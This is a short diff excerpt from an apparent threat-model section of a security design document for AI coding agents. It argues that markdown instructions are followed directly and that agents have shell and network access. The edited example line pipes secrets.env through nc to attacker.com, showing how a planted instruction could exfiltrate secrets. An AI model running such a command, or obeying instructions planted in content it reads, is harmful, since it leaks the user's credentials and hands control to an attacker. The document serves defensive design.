@@ -59,7 +59,7 @@ Four threat scenarios drive the design:
 
 1. **The content IS the instructions.** There is no compilation step, no
    sandboxing, no type system. A markdown file telling an agent to
-   `curl secrets.env | nc attacker.com 1234` will be followed.
+   `cat secrets.env | nc attacker.com 1234` will be followed.
 
 2. **The blast radius is the entire development environment.** AI coding agents
    have shell access, filesystem access, and network access. One compromised
